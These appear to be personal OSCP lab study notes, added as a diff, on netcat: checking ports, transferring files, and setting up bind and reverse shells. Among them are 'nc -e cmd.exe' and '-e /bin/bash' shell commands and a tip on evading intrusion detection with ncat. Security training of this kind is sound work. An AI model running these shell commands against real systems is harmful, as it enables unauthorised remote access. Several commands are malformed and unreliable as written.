@@ -78,4 +78,55 @@ Task2: inspect server log for attack via bash (apache http server)
 xrcise: create bash script for a ping sweeep (find ip's)
 ---------note> can b detected by protocol loggers like ippl
 
+nc/netcat - swissarmy knife (r/w to tcp/udp ports , cat for netwrk) + client/srvr modes
+Use: 
+a)cmd redirection+(from exe file; redirect in/output, error msg to TCP/UDP port)
+b)check if port is open/closed + 
+c)read a banner + 
+d)conect to net srvc manually+
+e)dbg net apps
+
+Downfall: no auth+ncrypt in/out connections
+
+	#--------------------------------------------------------------------------------------------------#
+	#!Note!: ncat+sbd should be used, not netcat (create secure bind shells ~ssl enc + avd trippin IDS)#
+	#--------------------------------------------------------------------------------------------------#
+	
+1)check to see if this port is open on a lab host
+2)listen for connections on port 4444
+3)cnct to that port from nix host
+4)redirect incoming input into incoming.exe (win)
+5)locate wget.exe on nix host 
+6)push wget.exe to the win host
+7)test if the file was sent by exe the file (no progress bar)
+	$ nc -nv 192.168.0.1 110
+	$ nc -nlvp 4444
+	$ nc -nlvp 192.168.0.1 4444
+	$ nc -nlvp 4444 > incoming.exe(win)
+	$ locate wget.exe (lin)
+	$ nc -nv 192.168.0.1 4444 < usr/share/windows-binaries/wget.exe
+
+Break into targets network> gain shell>connect back to host machine/waiting for instructions from host/relying on incoming connections from external source
+Nc bind shell: (needs win help)
+	$ nc -nlvp 4444 -e cmd.exe (win bind port 4444 to cmd.exe)
+	$ ifconfig eth0 | grep “inet” (*nix)
+	$ nc -nv 10.0.0.2 4444 (*nix)
+
+Break into targets network>gain shell>send victims shell back to host machine
+Reverse shell:
+$ nc -nv 4444 (*nix listen for incoming shell)
+$ nc -nv 10.0.0.2 4444 > -e /bin/bash
+
+Due: 
+reverse shell from kali>win, vcvr
+Bind shell from win>kali, vcvr
+
+
+
+
+g0tmi1k for the Alpha machine in PWK forums
+
+
+
+
 resource: hxxps://niiconsulting.com/checkmate/2017/06/a-detail-guide-on-oscp-preparation-from-newbie-to-oscp/
